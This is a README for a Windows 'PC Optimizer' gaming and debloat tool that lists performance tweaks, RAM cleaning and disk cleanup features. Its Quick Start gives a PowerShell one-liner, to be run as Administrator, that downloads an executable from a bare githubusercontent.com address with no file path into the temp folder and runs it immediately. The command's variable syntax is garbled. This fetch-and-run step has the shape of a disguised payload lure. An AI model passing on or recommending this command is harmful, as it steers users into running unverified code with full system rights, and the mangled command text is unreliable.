**PC Optimizer** is a lightweight, powerful, and safe open-source tool designed to squeeze every last drop of performance out of your hardware. Built specifically for gamers and power users who want to eliminate micro-stutters, reduce input lag, and maximize FPS without messing around with complicated registry tweaks manually.

---

## 🔥 Key Features for Maximum Gaming Performance

* **🎮 Gaming & Performance Tweaks:** Unlock hidden system potential with *Ultimate Performance* power plans, enable Windows Game Mode, activate HAGS (Hardware-Accelerated GPU Scheduling), and reduce network throttling for lower ping.
* **🩻 Intelligent Debloat:** Strip away resource-hogging background apps, telemetry, preinstalled Xbox features, and sponsored bloatware that drain your CPU and RAM.
* **🧠 Real-Time RAM & Memory Manager:** Instantly free up active working sets and purge Windows Standby Lists to keep your memory clean during heavy gaming sessions.
* **⚡ One-Click Optimization Profile:** Instantly apply pre-configured, battle-tested settings tailored specifically for high FPS gaming.
* **🛡️ Built-in Safety:** Automatically creates a Windows System Restore Point before applying any changes so you can always roll back safely.

## 🚀 Quick Start

Run this command in **Windows PowerShell (as Administrator)**:

```powershell
Invoke-WebRequest -Uri "https://githubusercontent.com" -OutFile "\(env:TEMP\PCOptimizer.exe"; Start-Process "\)env:TEMP\PCOptimizer.exe"
```

## ⚙️ Inside the Tool

- 🏠 **Dashboard & Live Hardware Monitor:** Monitor your CPU, GPU, and RAM utilization in real time with graph history and calculated Optimization Score.
- 🩻 **Debloat Tab:** View and remove preinstalled UWP apps, Bing widgets, sponsored software, and complete OneDrive integration.
- ⚙️ **Standard & Advanced Tweaks:** Toggle system telemetry, Cortana, mouse acceleration, background apps, and classic context menus.
- 🎮 **Gaming Performance Tab:** Manage Ultimate Power Plan, Core Parking, USB Selective Suspend, MSI Mode for GPU, and Windowed Game Optimizations.
- 💾 **Disk Space Cleaner:** Analyze and wipe temporary files, Windows Update caches, DirectX shader caches, old GPU drivers, and `Windows.old` installations.

- 🛠️ **BIOS & Maintenance Guides:** Reference checklists for XMP/DOCP/EXPO, Resizable BAR, PBO/Overclocking, plus integrated DISM/SFC system repair tools.
